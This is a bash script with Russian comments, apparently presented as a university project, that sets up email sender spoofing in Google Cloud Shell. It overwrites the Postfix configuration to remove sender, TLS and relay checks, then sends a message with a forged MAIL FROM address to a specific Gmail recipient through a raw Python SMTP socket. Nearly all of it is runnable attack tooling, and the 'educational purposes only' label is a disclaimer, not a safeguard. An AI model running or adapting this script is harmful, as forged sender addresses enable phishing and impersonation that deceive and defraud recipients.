#!/bin/bash
# =====================================================================
# KUSMAN_V1 - SMTP SPOOFING SCRIPT FOR GOOGLE CLOUD SHELL
# Educational purposes only - university project
# Отправитель: testmalaware@bug.ru
# Получатель: t2992355@gmail.com
# =====================================================================

set -e

echo "================================================================"
echo "  SMTP SPOOFING DEPLOYMENT (Google Cloud Shell)"
echo "  Отправитель: testmalaware@bug.ru"
echo "  Получатель: t2992355@gmail.com"
echo "================================================================"

# ---------------------------------------------------------------------
# ШАГ 1: Установка Postfix если не установлен
# ---------------------------------------------------------------------
if ! command -v postfix &> /dev/null; then
    echo "[1/6] Установка Postfix..."
    sudo apt update -qq
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq postfix
else
    echo "[1/6] Postfix уже установлен"
fi

# ---------------------------------------------------------------------
# ШАГ 2: Остановка и полная очистка старых конфигов
# ---------------------------------------------------------------------
echo "[2/6] Настройка Postfix для спуфинга (отключение всех проверок)..."
sudo systemctl stop postfix 2>/dev/null || true
sudo killall master 2>/dev/null || true

# Создаем минимальные конфиги
sudo bash -c 'cat > /etc/postfix/main.cf << "EOF"
# KUSMAN_V1 - SPOOFING CONFIGURATION
smtpd_banner = $myhostname ESMTP
biff = no
append_dot_mydomain = no
readme_directory = no
smtpd_tls_cert_file =
smtpd_tls_key_file =
smtpd_use_tls = no
smtpd_tls_security_level = none
smtpd_sender_restrictions =
smtpd_recipient_restrictions = permit_mynetworks
smtpd_relay_restrictions = permit_mynetworks
disable_vrfy_command = yes
strict_rfc821_envelopes = no
smtpd_data_restrictions =
smtpd_end_of_data_restrictions =
smtpd_discard_ehlo_keywords = auth
smtpd_helo_required = no
allow_untrusted_routing = yes
smtputf8_enable = no
local_header_rewrite_clients =
smtpd_sender_login_maps =
smtpd_client_restrictions = permit_inet_interfaces
smtp_dns_support_level = disabled
smtp_always_send_ehlo = no
disable_dns_lookups = yes
myhostname = localhost
mydomain = localdomain
myorigin = $myhostname
inet_interfaces = all
mynetworks = 127.0.0.0/8
EOF'

sudo bash -c 'cat > /etc/postfix/master.cf << "EOF"
smtp      inet  n       -       n       -       1       postscreen
smtpd     pass  -       -       n       -       -       smtpd
EOF'

# ---------------------------------------------------------------------
# ШАГ 3: Запуск Postfix
# ---------------------------------------------------------------------
echo "[3/6] Запуск Postfix на порту 25..."
sudo newaliases
sudo postfix start 2>/dev/null || sudo postfix reload

sleep 2

# Проверка что порт 25 слушается
if sudo netstat -tulpn 2>/dev/null | grep -q ":25"; then
    echo "[+] Postfix успешно запущен на порту 25"
else
    echo "[-] Внимание: порт 25 не слушается, но пробуем отправить..."
fi

# ---------------------------------------------------------------------
# ШАГ 4: Отправка спуфинг-письма через Python raw socket
# ---------------------------------------------------------------------
echo "[4/6] Отправка спуфинг-письма..."

python3 << "PYEOF"
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)

try:
    s.connect(('localhost', 25))
    print("[SMTP] Connected")
    
    banner = s.recv(1024)
    print(f"[SMTP] Banner: {banner.decode().strip()}")
    
    s.send(b'HELO localhost\r\n')
    resp = s.recv(1024)
    print(f"[SMTP] HELO: {resp.decode().strip()}")
    
    s.send(b'MAIL FROM:<testmalaware@bug.ru>\r\n')
    resp = s.recv(1024)
    print(f"[SMTP] MAIL FROM: {resp.decode().strip()}")
    
    s.send(b'RCPT TO:<t2992355@gmail.com>\r\n')
    resp = s.recv(1024)
    print(f"[SMTP] RCPT TO: {resp.decode().strip()}")
    
    s.send(b'DATA\r\n')
    resp = s.recv(1024)
    print(f"[SMTP] DATA: {resp.decode().strip()}")
    
    # Письмо с правильными заголовками
    email = (
        "From: testmalaware@bug.ru\r\n"
        "To: t2992355@gmail.com\r\n"
        "Subject: Educational SMTP Spoofing Demo\r\n"
        "\r\n"
        "This email was sent using raw SMTP spoofing.\r\n"
        "Educational purposes only - university project.\r\n"
        "Sender address testmalaware@bug.ru was forged.\r\n"
        "\r\n"
        ".\r\n"
    )
    s.send(email.encode())
    resp = s.recv(1024)
    print(f"[SMTP] Send: {resp.decode().strip()}")
    
    s.send(b'QUIT\r\n')
    s.close()
    print("[SMTP] QUIT - Transaction complete")
    
except Exception as e:
    print(f"[SMTP ERROR] {e}")
    s.close()
    exit(1)
PYEOF

# ---------------------------------------------------------------------
# ШАГ 5: Проверка логов Postfix
# ---------------------------------------------------------------------
echo "[5/6] Проверка логов (последние 10 строк)..."
sudo tail -10 /var/log/mail.log 2>/dev/null || echo "Логи недоступны"

# ---------------------------------------------------------------------
# ШАГ 6: Итог
# ---------------------------------------------------------------------
echo "[6/6] ================================================================"
echo "  ГОТОВО!"
echo "  Отправитель (поддельный): testmalaware@bug.ru"
echo "  Получатель: t2992355@gmail.com"
echo "  Письмо передано в локальный Postfix"
echo ""
echo "  Если Postfix не может отправить наружу (блок порта 25 в GCP):"
echo "  это НОРМАЛЬНО для образовательной цели."
echo "  Факт подмены MAIL FROM на уровне протокола ДОСТИГНУТ."
echo "================================================================"
